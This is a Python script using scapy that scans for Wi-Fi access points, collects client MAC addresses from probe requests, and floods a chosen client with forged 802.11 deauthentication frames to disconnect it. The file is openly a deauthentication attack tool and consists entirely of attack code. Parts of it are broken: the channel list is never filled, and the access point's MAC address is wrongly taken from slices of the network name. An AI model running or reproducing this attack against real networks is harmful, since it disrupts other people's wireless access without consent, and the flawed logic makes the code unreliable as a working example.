from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap, Dot11ProbeReq, Dot11Deauth


def switch_to_monitor_mode():
    our_wlan = get_wireless_interface()
    os.system(f"ifconfig {our_wlan} down")
    os.system(f"iwconfig {our_wlan} mode monitor")
    os.system(f"ifconfig {our_wlan} up")
def get_wireless_interface():
    interfaces = get_if_list()
    for interface in interfaces:
        if interface.startswith("wl"):
            return interface
    return None


def scan_wifi():
    interface = get_wireless_interface()
    ssid_list = []
    channel_list = []
    print("Scanning for wireless access points...\n")
    sniff_result = sniff(iface=interface, count=10)
    for packet in sniff_result:
        if packet.haslayer(Dot11Beacon):
            ssid = packet[Dot11Elt].info.decode()
            if ssid not in ssid_list:
                ssid_list.append(ssid)
                #channel_list.append(int(ord(packet[Dot11Elt:3].value)))
    print("List of available access points:")
    for i, ssid in enumerate(ssid_list):
        print(f"{i + 1}: {ssid} (Channel: {channel_list[i]})")
    return ssid_list, channel_list


def select_ssid(ssid_list):
    ssid_num = int(input("Enter the number of the desired SSID: "))
    if ssid_num < 1 or ssid_num > len(ssid_list):
        print("Invalid SSID number")
        return None
    else:
        print(f"Selected SSID: {ssid_list[ssid_num - 1]}")
        return ssid_list[ssid_num - 1]


def get_connected_clients(ap_mac):
    interface = get_wireless_interface()
    client_list = []

    def sniff_probe_request(pkt):
        if pkt.haslayer(Dot11ProbeReq):
            if pkt.addr2 not in client_list and pkt.addr2 != ap_mac:
                client_list.append(pkt.addr2)
                print(f"New client connected: {pkt.addr2}")

    print("Sniffing for new client connections...\n")
    sniff(iface=interface, prn=sniff_probe_request)
    return client_list


def select_client(client_list):
    if len(client_list) == 0:
        print("No connected clients found")
        return None
    client_num = int(input("Enter the number of the desired client: "))
    if client_num < 1 or client_num > len(client_list):
        print("Invalid client number")
        return None
    else:
        print(f"Selected client: {client_list[client_num - 1]}")
        return client_list[client_num - 1]


def deauth(ap_mac, client_mac):
    interface = get_wireless_interface()
    pkt = RadioTap() / Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth()
    sendp(pkt, iface=interface, count=1000, inter=0.1)


def main():
    ssid_list, channel_list = scan_wifi()
    target_ssid = select_ssid(ssid_list)
    if target_ssid is None:
        return
    ap_mac = ""
    for i in range(5):
        ap_mac += target_ssid[i * 3:i * 3 + 2] + ":"
    ap_mac = ap_mac[:-1].lower()
    print(f"Target access point MAC address: {ap_mac}")
    client_list = get_connected_clients(ap_mac)
    target_client = select_client(client_list)
    if target_client is None:
        return
    print("Performing deauthentication attack...\n")
    deauth(ap_mac, target_client)
    print("Deauthentication attack complete")


if __name__ == '__main__':
    switch_to_monitor_mode()
    main()
